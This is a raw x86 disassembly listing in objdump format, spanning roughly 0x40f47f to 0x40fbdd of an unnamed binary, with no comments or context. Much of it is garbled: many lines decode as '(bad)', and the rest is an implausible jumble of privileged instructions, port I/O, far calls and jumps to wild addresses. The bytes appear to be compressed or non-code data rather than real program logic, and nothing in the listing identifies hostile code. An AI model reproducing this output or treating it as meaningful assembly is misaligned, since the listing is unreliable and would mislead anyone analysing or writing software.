  40f47f:	push   ebp
  40f480:	inc    ebp
  40f481:	xor    DWORD PTR [ebx],0x8
  40f484:	mov    WORD PTR [ebp-0x72],ax
  40f488:	push   cx
  40f48a:	inc    ebp
  40f48b:	adc    WORD PTR [ebp-0x64],0xff83
  40f490:	mov    DWORD PTR [ebx],0x92b589f8
  40f496:	clc    
  40f497:	push   ecx
  40f498:	inc    ebp
  40f499:	data16 cmc 
  40f49b:	push   ebp
  40f49c:	pushf  
  40f49d:	data16 (bad) 
  40f49f:	dec    ebp
  40f4a0:	in     al,0x83
  40f4a2:	test   DWORD PTR [edi-0x76ba3508],eax
  40f4a8:	xor    ebx,DWORD PTR [eax+0xc7329c]
  40f4ae:	in     al,0x8b
  40f4b0:	add    eax,0x45b5f866
  40f4b5:	dec    DWORD PTR [ebx+0xf094ff]
  40f4bb:	mov    DWORD PTR [ecx+0x45fff466],ecx
  40f4c1:	lea    ecx,[ebx-0x4e76e3b3]
  40f4c7:	push   0x6600ff01
  40f4cc:	push   cs
  40f4cd:	test   DWORD PTR [eax+0xff01ff],eax
  40f4d3:	inc    ecx
  40f4d4:	inc    ebp
  40f4d5:	mov    WORD PTR [ebp-0x360018],ax
  40f4dc:	push   cs
  40f4dd:	shl    BYTE PTR [ebp+0x66],0x8b
  40f4e1:	test   DWORD PTR [edi+edi*8],ebx
  40f4e4:	cs (bad) 
  40f4e6:	inc    DWORD PTR [ecx-0x75]
  40f4e9:	data16 in al,dx
  40f4eb:	test   DWORD PTR [eax],ecx
  40f4ed:	inc    DWORD PTR [eax]
  40f4ef:	inc    DWORD PTR [ecx-0x77]
  40f4f2:	mov    esi,DWORD PTR [edx-0x77]
  40f4f5:	call   FWORD PTR [eax]
  40f4f7:	leavew 
  40f4f9:	xchg   ebp,eax
  40f4fa:	inc    edi
  40f4fb:	push   DWORD PTR [ebp-0x1]
  40f4fe:	call   0xff50e048
  40f503:	lea    eax,[ebp-0x1]
  40f506:	mov    edi,edi
  40f508:	enter  0xc7,0xc3
  40f50c:	mov    eax,ecx
  40f50e:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  40f514:	sbb    al,0x8b
  40f516:	sbb    esp,edi
  40f518:	dec    ebp
  40f519:	mov    bh,0x8b
  40f51b:	mov    ah,cl
  40f51d:	mov    DWORD PTR [eax],0x8bc1ffc3
  40f523:	mov    eax,ebx
  40f525:	mov    BYTE PTR [eax],al
  40f527:	sar    bh,0x89
  40f52a:	sub    BYTE PTR [eax-0x77ff766c],cl
  40f530:	mov    esp,DWORD PTR [ebp+0x7c]
  40f533:	add    BYTE PTR [eax],al
  40f535:	inc    ebp
  40f536:	mov    esi,DWORD PTR ds:0xc7049c8d
  40f53c:	or     ah,bl
  40f53e:	add    BYTE PTR [ebp+0x458bf800],0x85
  40f545:	xor    DWORD PTR [edi],ecx
  40f547:	pushf  
  40f548:	js     0x40f511
  40f54a:	add    al,dh
  40f54c:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  40f552:	inc    eax
  40f553:	xor    eax,0x8b209f89
  40f558:	call   FWORD PTR [ebx+ecx*4]
  40f55b:	cmp    al,0x1
  40f55e:	mov    DWORD PTR [eax],0x8b8545c3
  40f564:	call   FWORD PTR [edi+edi*8]
  40f567:	dec    ebp
  40f568:	inc    ebp
  40f569:	mov    eax,DWORD PTR [ebx-0xffe374]
  40f56f:	mov    eax,DWORD PTR [eax]
  40f571:	mov    eax,edi
  40f573:	nop
  40f574:	ret    
  40f575:	add    BYTE PTR [ebp-0x130077],al
  40f57b:	jne    0x40f502
  40f57d:	test   edi,edi
  40f57f:	jne    0x40f580
  40f581:	dec    DWORD PTR [ebx-0x38aa1fe8]
  40f587:	call   0xffccf24f
  40f58c:	sbb    al,0x45
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	mov    eax,DWORD PTR [eax]
  40f591:	mov    edx,DWORD PTR [eax+0x3]
  40f594:	inc    ebp
  40f595:	cmp    al,0x8b
  40f597:	push   cs
  40f598:	cwde   
  40f599:	inc    ebp
  40f59a:	add    BYTE PTR [ebp-0xe78b39],al
  40f5a0:	call   FWORD PTR [esp+eax*1]
  40f5a3:	test   eax,0x8bffff00
  40f5a8:	mov    DWORD PTR [esp+eiz*4],ebx
  40f5ab:	adc    BYTE PTR [ebp+0x1],0x8b
  40f5af:	add    al,ch
  40f5b1:	add    al,dh
  40f5b3:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  40f5ba:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  40f5c0:	inc    ebp
  40f5c1:	add    DWORD PTR [ebx-0x7aceb000],ecx
  40f5c7:	cmp    bh,0x1
  40f5ca:	inc    DWORD PTR [eax]
  40f5cc:	inc    ebp
  40f5cd:	push   eax
  40f5ce:	xor    ebp,ecx
  40f5d0:	add    eax,DWORD PTR [edx]
  40f5d2:	mov    DWORD PTR [eax],eax
  40f5d4:	and    al,0x80
  40f5d6:	inc    DWORD PTR [ecx]
  40f5d8:	lea    eax,[eax]
  40f5da:	pushf  
  40f5db:	or     BYTE PTR [ebp-0xfe00bb],al
  40f5e1:	jmp    0x13ff86b
  40f5e6:	dec    DWORD PTR [esi]
  40f5e8:	mov    ecx,ecx
  40f5ea:	loopne 0x40f571
  40f5ec:	mov    DWORD PTR [edx],0x4d8b00c3
  40f5f2:	sbb    al,0x8b
  40f5f4:	out    dx,al
  40f5f5:	mov    eax,DWORD PTR [eax]
  40f5f7:	push   eax
  40f5f8:	push   eax
  40f5f9:	test   DWORD PTR [ebp-0x1],eax
  40f5fc:	mov    edi,edi
  40f5fe:	cwde   
  40f5ff:	inc    ebp
  40f600:	add    BYTE PTR [ebx],dh
  40f602:	mov    DWORD PTR [ebx],0x24ff8918
  40f608:	add    al,0xff
  40f60a:	add    BYTE PTR [ebx-0x5ae30f77],cl
  40f610:	(bad)  
  40f611:	(bad)  
  40f612:	(bad)  
  40f613:	(bad)  
  40f614:	push   DWORD PTR [ebx]
  40f616:	or     BYTE PTR [ebx],al
  40f618:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  40f61f:	(bad)  
  40f620:	cld    
  40f621:	sbb    BYTE PTR [ebx+0x765050ff],al
  40f627:	inc    ebp
  40f628:	mov    esi,DWORD PTR [ebx]
  40f62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	add    ecx,esi
  40f62d:	push   eax
  40f62e:	mov    BYTE PTR [ebp+0x4d],0x5
  40f632:	jmp    0x40f634
  40f634:	mov    eax,DWORD PTR [eax]
  40f636:	clc    
  40f637:	mov    ecx,DWORD PTR [esp+ebx*1]
  40f63a:	inc    DWORD PTR [eax+0x5501fc]
  40f640:	mov    BYTE PTR [ebp-0xe70075],al
  40f646:	cmp    eax,DWORD PTR [eax]
  40f648:	push   eax
  40f649:	add    cl,ch
  40f64b:	xor    BYTE PTR [esi+0x4d],cl
  40f64e:	add    edi,edi
  40f650:	mov    ecx,DWORD PTR [eax]
  40f652:	mov    al,ds:0x8b8b004d
  40f657:	mov    ebp,DWORD PTR [ebx]
  40f659:	hlt    
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	add    dh,al
  40f65d:	add    DWORD PTR [ebp+0x45],edx
  40f660:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  40f666:	dec    ebp
  40f667:	inc    eax
  40f668:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  40f66e:	add    BYTE PTR [ebx-0x38162400],cl
  40f674:	add    bl,al
  40f676:	add    BYTE PTR [ebp-0x2e003e],al
  40f67c:	mov    DWORD PTR [ebp-0x10],eax
  40f67f:	mov    DWORD PTR [ebp+0x28],esp
  40f682:	push   eax
  40f683:	dec    DWORD PTR [ecx+0x5518e88d]
  40f689:	dec    DWORD PTR [ecx+0x5545f050]
  40f68f:	xor    ecx,DWORD PTR [edi]
  40f691:	add    edx,DWORD PTR [edx]
  40f693:	push   eax
  40f694:	xchg   ebp,eax
  40f695:	inc    ebp
  40f696:	inc    DWORD PTR ds:0xe200ff
  40f69c:	jnp    0x809612a2
  40f6a2:	mov    eax,DWORD PTR [ecx]
  40f6a4:	pusha  
  40f6a5:	add    bh,bh
  40f6a7:	test   ecx,eax
  40f6a9:	dec    DWORD PTR [edi+edi*8]
  40f6ac:	ret    0x8d00
  40f6af:	add    bh,bh
  40f6b1:	mov    ch,0xd7
  40f6b3:	(bad)  
  40f6b4:	cli    
  40f6b5:	inc    DWORD PTR [ebp+0x2255f830]
  40f6bb:	test   DWORD PTR [ebp+0x74],ecx
  40f6be:	add    ecx,DWORD PTR [ebx+0x65a01889]
  40f6c4:	or     BYTE PTR [eax],al
  40f6c6:	cmp    DWORD PTR [eax+0x74],edi
  40f6c9:	add    BYTE PTR [ebx+0x114dfc23],cl
  40f6cf:	sub    eax,DWORD PTR [eax]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x77]
  40f6d4:	mov    eax,edi
  40f6d6:	add    DWORD PTR [ebx],eax
  40f6d8:	inc    ebp
  40f6d9:	dec    ebp
  40f6da:	mov    ecx,DWORD PTR [edx+0x45450118]
  40f6e0:	add    cl,BYTE PTR [ebx+0x875fc4d]
  40f6e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e9:	inc    eax
  40f6ea:	push   ebp
  40f6eb:	push   ecx
  40f6ec:	mov    esi,DWORD PTR [edx-0x14]
  40f6ef:	mov    edx,DWORD PTR [ecx+0xce003c]
  40f6f5:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  40f6fc:	add    al,0x55
  40f6fe:	push   ebp
  40f6ff:	add    ecx,DWORD PTR [ecx-0x2d030777]
  40f705:	push   ecx
  40f706:	test   DWORD PTR [ebx],eax
  40f708:	dec    DWORD PTR [ecx+0x554518ff]
  40f70e:	mov    edi,eax
  40f710:	sbb    al,0xec
  40f712:	inc    DWORD PTR [eax]
  40f714:	mov    DWORD PTR [eax],0xff8318
  40f71a:	add    al,0x83
  40f71c:	add    al,bh
  40f71e:	mov    ebp,edx
  40f720:	push   eax
  40f721:	push   ebp
  40f722:	test   DWORD PTR [edi+edi*8-0x73],esi
  40f726:	dec    DWORD PTR [eax]
  40f728:	inc    ebp
  40f729:	push   ebp
  40f72a:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  40f730:	and    al,0x8b
  40f732:	(bad)  
  40f733:	call   0x89ddaec5
  40f738:	test   DWORD PTR [eax-0x1],esp
  40f73b:	(bad)  
  40f73c:	inc    DWORD PTR [ecx+0xffff85]
  40f742:	dec    DWORD PTR [ecx-0x6a1f5f75]
  40f748:	(bad)  
  40f749:	inc    ebx
  40f74b:	dec    DWORD PTR [ebx-0x117ee316]
  40f751:	arpl   WORD PTR [eax],ax
  40f753:	int    0x50
  40f755:	xor    eax,DWORD PTR [ebp-0x7f]
  40f758:	mov    esi,DWORD PTR [eax]
  40f75a:	cwde   
  40f75b:	pushf  
  40f75c:	add    BYTE PTR [ebp-0x1],dh
  40f75f:	mov    edi,edi
  40f761:	mov    al,ds:0x4d45ce08
  40f766:	inc    DWORD PTR [ebx]
  40f768:	adc    al,0x83
  40f76a:	add    BYTE PTR [eax],0x1
  40f76d:	adc    BYTE PTR [eax],al
  40f76f:	push   ebp
  40f770:	inc    ebp
  40f771:	add    edi,edi
  40f773:	mov    edx,DWORD PTR [eax]
  40f775:	mov    ecx,DWORD PTR [ebp-0x60]
  40f778:	push   esi
  40f779:	adc    al,0x8
  40f77b:	mov    edx,DWORD PTR [ebp-0x8]
  40f77e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f781:	add    DWORD PTR [ebp-0x18],0xffffff8d
  40f785:	inc    DWORD PTR [eax+esi*8]
  40f788:	inc    ebp
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	mov    edx,DWORD PTR [ebp+0x1c]
  40f78d:	add    DWORD PTR [ebp-0x14],eax
  40f790:	mov    edx,DWORD PTR [ebp-0x70]
  40f793:	cmp    eax,DWORD PTR [eax]
  40f795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f796:	mov    eax,DWORD PTR [eax]
  40f798:	sbb    al,0x73
  40f79a:	add    BYTE PTR [ebx],0x1
  40f79d:	hlt    
  40f79e:	add    BYTE PTR [eax+0x30],dl
  40f7a1:	mov    DWORD PTR [ecx],esi
  40f7a3:	hlt    
  40f7a4:	pop    ds
  40f7a5:	inc    ebp
  40f7a6:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  40f7ac:	(bad)  
  40f7ad:	push   DWORD PTR [edi]
  40f7af:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  40f7b5:	push   DWORD PTR [ebx-0x1]
  40f7b8:	mov    eax,DWORD PTR [ebp-0x740075]
  40f7be:	sub    eax,DWORD PTR [eax]
  40f7c0:	add    eax,DWORD PTR [eax]
  40f7c2:	mov    DWORD PTR [ecx+0x5f],eax
  40f7c5:	mov    DWORD PTR [ebx+0x20],ebx
  40f7c8:	ret    0xff
  40f7cb:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  40f7d1:	ret    
  40f7d2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f7d8:	add    BYTE PTR [ebp-0x7d],al
  40f7db:	mov    DWORD PTR [eax],eax
  40f7dd:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  40f7e4:	sar    bh,cl
  40f7e6:	test   BYTE PTR [eax+0x1],dl
  40f7e9:	inc    ebp
  40f7ea:	add    BYTE PTR [ebx],dh
  40f7ec:	test   BYTE PTR [ebx],0x84
  40f7ef:	push   eax
  40f7f0:	add    BYTE PTR [ebp+0x0],al
  40f7f3:	add    eax,0x86
  40f7f8:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f7fe:	add    BYTE PTR [ecx],al
  40f800:	add    BYTE PTR [eax],al
  40f802:	mov    esi,0x550030
  40f807:	mov    ecx,DWORD PTR [edi]
  40f809:	sbb    al,0xda
  40f80b:	jne    0x40f80d
  40f80d:	mov    edi,DWORD PTR [ecx]
  40f80f:	xor    BYTE PTR [eax+eax*1],0x84
  40f813:	add    eax,DWORD PTR [eax]
  40f815:	cld    
  40f816:	add    BYTE PTR [ebp-0x4f],dh
  40f819:	mov    eax,DWORD PTR [ecx]
  40f81b:	cld    
  40f81c:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f822:	retf   0xe45
  40f825:	add    eax,edx
  40f827:	sbb    al,0xb7
  40f829:	dec    ebp
  40f82a:	or     al,0x89
  40f82c:	dec    ebp
  40f82d:	sbb    al,0xf
  40f82f:	inc    ebp
  40f830:	dec    eax
  40f831:	mov    eax,DWORD PTR [ebx]
  40f833:	sbb    al,0xf
  40f835:	nop
  40f836:	scas   al,BYTE PTR es:[edi]
  40f837:	add    DWORD PTR [eax],eax
  40f839:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f83f:	mov    eax,gs
  40f841:	add    bh,bh
  40f843:	mov    edi,edi
  40f845:	cmp    DWORD PTR [edi+0x72],edx
  40f848:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f84e:	gs cmp al,0x0
  40f851:	je     0x40f829
  40f853:	push   eax
  40f854:	sar    BYTE PTR [eax],1
  40f856:	mov    bh,0x3e
  40f858:	push   cs
  40f859:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f85f:	add    DWORD PTR [ecx+0x12],ebp
  40f862:	dec    edx
  40f863:	(bad)  
  40f864:	mov    eax,edx
  40f866:	in     al,dx
  40f867:	adc    DWORD PTR [ecx],esi
  40f869:	pop    esi
  40f86a:	inc    ecx
  40f86b:	leave  
  40f86c:	or     DWORD PTR [eax],ebx
  40f86e:	gs push ebp
  40f870:	add    ah,ch
  40f872:	into   
  40f873:	in     al,dx
  40f874:	enter  0xb756,0xf0
  40f878:	push   cs
  40f879:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f883:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f889:	jnp    0x74417d91
  40f88f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f895:	add    BYTE PTR [edi],cl
  40f897:	mov    edi,DWORD PTR [ecx-0x78]
  40f89a:	ltr    WORD PTR [ecx-0x7b]
  40f89e:	dec    DWORD PTR [edi]
  40f8a0:	clc    
  40f8a1:	out    0x45,eax
  40f8a3:	add    BYTE PTR [eax],cl
  40f8a5:	cmp    ebx,0xffffff8c
  40f8a8:	jge    0x40f8aa
  40f8aa:	jb     0x40f8bc
  40f8ac:	je     0x4ff92c
  40f8b2:	pop    edx
  40f8b3:	push   esi
  40f8b4:	mov    ecx,DWORD PTR [edi]
  40f8b6:	in     al,dx
  40f8b7:	rol    DWORD PTR [ebp+0x0],1
  40f8ba:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f8c1:	cmp    DWORD PTR [ecx],0xfffffff0
  40f8c4:	hlt    
  40f8c5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f8cb:	(bad)  
  40f8cd:	push   eax
  40f8ce:	jns    0xb840dd4c
  40f8d4:	lock push cs
  40f8d6:	ror    edx,0x3
  40f8d9:	test   BYTE PTR [ecx+0x5500e800],cl
  40f8df:	dec    eax
  40f8e0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f8e4:	(bad)  
  40f8e5:	mov    esi,0x7f33ff5f
  40f8ea:	inc    eax
  40f8eb:	test   DWORD PTR [edx],eax
  40f8ed:	je     0x40f8af
  40f8ef:	mov    ecx,ecx
  40f8f1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f8f5:	and    eax,DWORD PTR [eax+0xf0103]
  40f8fb:	jp     0x40f8e9
  40f8fd:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f901:	add    edx,DWORD PTR [edi+0x74]
  40f904:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f90a:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f910:	je     0x40f895
  40f912:	cmp    eax,edi
  40f914:	js     0x40f939
  40f916:	add    eax,0xeb0fc003
  40f91b:	jns    0x40f8a8
  40f91d:	vmread DWORD PTR [ecx+0x45],ebx
  40f921:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f927:	adc    al,0x8b
  40f929:	jge    0x40f93f
  40f92b:	mov    edi,DWORD PTR [eax-0x4]
  40f92e:	add    edi,DWORD PTR [edi]
  40f930:	or     bh,bh
  40f932:	push   ebp
  40f933:	push   es
  40f934:	mov    DWORD PTR [ebp-0x4],ebx
  40f937:	add    edi,esi
  40f939:	pop    es
  40f93a:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f940:	mov    DWORD PTR [esp+esi*8],ecx
  40f943:	inc    ebp
  40f944:	pop    ebp
  40f945:	xor    DWORD PTR [esi-0x4],0x3b
  40f949:	add    edx,DWORD PTR [ecx+edi*1]
  40f94c:	push   es
  40f94d:	clc    
  40f94e:	mov    bh,0xdb
  40f950:	jp     0x40f909
  40f952:	add    cl,BYTE PTR [esi]
  40f954:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f95a:	test   edi,edi
  40f95c:	je     0x40f952
  40f95e:	mov    eax,ecx
  40f960:	or     BYTE PTR [ebx],al
  40f962:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f968:	jbe    0x40f9dc
  40f96a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f970:	add    ecx,DWORD PTR [esi]
  40f972:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f978:	add    eax,DWORD PTR [ebx-0x287af783]
  40f97e:	je     0x40f9cd
  40f980:	mov    DWORD PTR [ecx],edi
  40f982:	mov    esi,eax
  40f984:	hlt    
  40f985:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f98c:	jb     0x40f94e
  40f98e:	jmp    0x40f97b
  40f990:	xor    esi,DWORD PTR [ebx]
  40f992:	pop    edi
  40f993:	pop    esi
  40f994:	pop    ebx
  40f995:	ret    
  40f996:	ret    0x8b
  40f999:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f99f:	xor    DWORD PTR ds:0x89339c0c,0x56
  40f9a6:	cld    
  40f9a7:	cmp    DWORD PTR [ebp+0xf],eax
  40f9aa:	xor    al,BYTE PTR [ebp-0x7474ff64]
  40f9b0:	cld    
  40f9b1:	or     al,0x4d
  40f9b3:	ret    
  40f9b4:	mov    edi,DWORD PTR [esi-0x4]
  40f9b7:	pop    eax
  40f9b8:	dec    ebp
  40f9b9:	jne    0x40f946
  40f9bb:	xor    edi,esp
  40f9bd:	inc    eax
  40f9be:	dec    ebp
  40f9bf:	jbe    0x40fa14
  40f9c1:	inc    eax
  40f9c2:	pop    ebp
  40f9c3:	add    edx,DWORD PTR [esi+0x8]
  40f9c6:	push   esi
  40f9c7:	dec    eax
  40f9c8:	push   ecx
  40f9c9:	mov    eax,edi
  40f9cb:	and    al,0xf0
  40f9cd:	jo     0x40f9ba
  40f9cf:	mov    eax,DWORD PTR [ebx]
  40f9d1:	sbb    BYTE PTR [ebp+0x4d],cl
  40f9d4:	mov    eax,DWORD PTR [ebx]
  40f9d6:	nop
  40f9d7:	or     BYTE PTR [eax],al
  40f9d9:	jne    0x40fa32
  40f9db:	cmp    ebx,DWORD PTR [ebp+0x33893277]
  40f9e1:	cld    
  40f9e2:	xor    edi,edi
  40f9e4:	add    edi,DWORD PTR [ebp+0x3]
  40f9e7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f9ed:	js     0x40f973
  40f9ef:	jae    0x40f9f3
  40f9f1:	(bad)  
  40f9f3:	xor    al,0x5d
  40f9f5:	jmp    0x40f982
  40f9f7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f9fe:	fdecstp 
  40fa00:	test   BYTE PTR [edi],ah
  40fa02:	add    bh,BYTE PTR [ebp+0x0]
  40fa05:	add    ebx,DWORD PTR [ebp-0x77]
  40fa08:	mov    edi,eax
  40fa0a:	cmp    al,0x0
  40fa0d:	adc    dh,BYTE PTR [ebx]
  40fa0f:	jge    0x40fa14
  40fa11:	mov    edi,DWORD PTR [ebx]
  40fa13:	jl     0x40fa24
  40fa15:	clc    
  40fa16:	dec    edi
  40fa17:	jge    0x40fa19
  40fa19:	mov    eax,DWORD PTR [ebx]
  40fa1b:	jb     0x40fa25
  40fa1d:	mov    ecx,DWORD PTR [ebp-0x8]
  40fa20:	mov    edi,edi
  40fa22:	xor    edx,DWORD PTR [eax]
  40fa24:	add    edi,DWORD PTR [ebx]
  40fa26:	mov    DWORD PTR [ebp-0x10],edi
  40fa29:	inc    edi
  40fa2a:	pop    ebp
  40fa2b:	jge    0x40fa68
  40fa2d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40fa31:	mov    edx,0xc05d87f0
  40fa36:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40fa3a:	fimul  WORD PTR [eax]
  40fa3c:	fist   WORD PTR [ebp+0x1c]
  40fa3f:	in     al,dx
  40fa40:	jne    0x40fa2e
  40fa42:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40fa48:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40fa4c:	fdivp  st(0),st
  40fa4e:	fild   WORD PTR [ebp+0x4510f85c]
  40fa54:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40fa5a:	inc    ebp
  40fa5b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40fa61:	mov    ebp,DWORD PTR [ebx-0x4]
  40fa64:	adc    al,0x8b
  40fa66:	rcl    DWORD PTR [eax],0x48
  40fa69:	mov    esi,0x7080803
  40fa6e:	fiadd  WORD PTR [ebp+0x4d]
  40fa71:	(bad)  
  40fa72:	mov    edx,DWORD PTR [edx-0x4]
  40fa75:	mov    edx,DWORD PTR [ebp-0x4]
  40fa78:	xor    ebx,DWORD PTR [ebx+0x330103]
  40fa7e:	mov    DWORD PTR [edi+0x872dc],edi
  40fa84:	xlat   BYTE PTR ds:[ebx]
  40fa85:	into   
  40fa86:	ffreep st(6)
  40fa88:	retf   0x6c7
  40fa8b:	iret   
  40fa8c:	dec    ebp
  40fa8d:	inc    ebp
  40fa8e:	mov    DWORD PTR [ebx],edi
  40fa90:	fmul   QWORD PTR [edi]
  40fa92:	dec    ebp
  40fa93:	jnp    0x40fac8
  40fa95:	add    BYTE PTR [ebx],al
  40fa97:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa9a:	inc    ebp
  40fa9b:	dec    ebp
  40fa9c:	lea    esi,[ebx]
  40fa9e:	add    DWORD PTR [ebx],eax
  40faa0:	jb     0x40fadd
  40faa2:	add    BYTE PTR [edi],cl
  40faa4:	inc    ebp
  40faa5:	imul   eax,edi,0x858bd800
  40faab:	cld    
  40faac:	clc    
  40faad:	mov    DWORD PTR [ebp+0x0],eax
  40fab0:	inc    DWORD PTR [eax]
  40fab2:	or     al,0xde
  40fab4:	sbb    bh,0x1
  40fab7:	retf   
  40fab8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40fabf:	dec    ebp
  40fac0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40fac6:	enter  0x12de,0xdf
  40faca:	inc    ebp
  40facb:	pop    ebp
  40facc:	dec    DWORD PTR [ebx-0x257f0ff4]
  40fad2:	add    DWORD PTR [edx],edx
  40fad4:	add    BYTE PTR [ebp+0x50],dl
  40fad7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40fadd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40fae3:	or     ah,al
  40fae5:	pop    ss
  40fae6:	cdq    
  40fae7:	push   ebp
  40fae8:	clc    
  40fae9:	mov    eax,DWORD PTR [ebp-0x4]
  40faec:	xor    edx,edx
  40faee:	add    esi,DWORD PTR [ebx]
  40faf0:	cmp    eax,DWORD PTR [ebx]
  40faf2:	hlt    
  40faf3:	cmp    DWORD PTR [ebx],esp
  40faf5:	or     al,BYTE PTR [ebp+0xf]
  40faf8:	mov    eax,DWORD PTR [edx]
  40fafa:	loopne 0x40fafc
  40fafc:	(bad)  
  40fafd:	mov    ecx,esi
  40faff:	cld    
  40fb00:	pushf  
  40fb01:	pop    ebp
  40fb02:	popf   
  40fb03:	mov    esi,DWORD PTR [edx]
  40fb05:	lock mov eax,eax
  40fb08:	adc    BYTE PTR [ebx],al
  40fb0a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40fb11:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40fb17:	dec    ebp
  40fb18:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40fb1e:	(bad)  
  40fb1f:	iret   
  40fb20:	inc    ebp
  40fb21:	(bad)  
  40fb22:	jne    0x40fb71
  40fb24:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40fb2a:	(bad)  
  40fb2b:	cmp    ebx,eax
  40fb2d:	je     0x40fab5
  40fb2f:	add    edi,edi
  40fb31:	or     bh,bh
  40fb33:	dec    ebp
  40fb34:	inc    ebp
  40fb35:	mov    esi,DWORD PTR [ebx]
  40fb37:	cld    
  40fb38:	add    ecx,esi
  40fb3a:	cmp    ecx,DWORD PTR [eax-0xc]
  40fb3d:	mov    edx,DWORD PTR [edi]
  40fb3f:	or     BYTE PTR [ebp-0x7c],al
  40fb42:	mov    ebx,DWORD PTR [ebp-0x7639cd18]
  40fb48:	test   BYTE PTR [ebx*4-0x76c1cdbb],cl
  40fb4f:	pushf  
  40fb50:	call   0x51eae0
  40fb55:	jne    0x40fb1e
  40fb57:	mov    ebp,esp
  40fb59:	fcomp  DWORD PTR [ebx]
  40fb5b:	add    BYTE PTR [ecx],al
  40fb5d:	inc    DWORD PTR [ebp-0x75]
  40fb60:	(bad)  
  40fb61:	cld    
  40fb62:	add    al,0xce
  40fb64:	mov    ecx,edi
  40fb66:	cld    
  40fb67:	inc    ebp
  40fb68:	fidivr WORD PTR [ebx]
  40fb6a:	fbstp  TBYTE PTR [ebp-0x3e]
  40fb6d:	mov    eax,DWORD PTR [eax]
  40fb6f:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fb75:	fadd   st,st(7)
  40fb77:	add    BYTE PTR [ebp-0x1],al
  40fb7a:	mov    ecx,DWORD PTR [esp+edi*8]
  40fb7d:	inc    ebp
  40fb7e:	mov    bh,0xc7
  40fb81:	loopne 0x40fbc8
  40fb83:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fb89:	sbb    dh,BYTE PTR [ebx]
  40fb8b:	pushf  
  40fb8c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fb92:	mov    eax,edi
  40fb94:	cwde   
  40fb95:	inc    ebp
  40fb96:	inc    ebp
  40fb97:	jne    0x40fb24
  40fb99:	mov    esp,esp
  40fb9b:	clc    
  40fb9c:	add    al,0x4d
  40fb9e:	mov    DWORD PTR [ebx],esi
  40fba0:	or     al,0x33
  40fba2:	inc    ebp
  40fba3:	lea    ecx,[ebx-0x398d13fd]
  40fba9:	add    bh,al
  40fbab:	inc    ebp
  40fbac:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fbb3:	add    ebp,esp
  40fbb5:	shufps xmm1,xmm3,0xc7
  40fbb9:	(bad)  
  40fbba:	jmp    0x748636e3
  40fbbf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fbc5:	hlt    
  40fbc6:	mov    ecx,DWORD PTR [edi]
  40fbc8:	fadd   DWORD PTR [ebp+0x0]
  40fbcb:	xor    ecx,DWORD PTR [edi]
  40fbcd:	add    ecx,ecx
  40fbcf:	cmp    edi,edi
  40fbd1:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fbd5:	(bad)  
  40fbd6:	jmp    0x40fb63
  40fbd8:	mov    edi,esp
  40fbda:	or     al,0xc6
  40fbdc:	inc    ebp
  40fbdd:	(bad)  
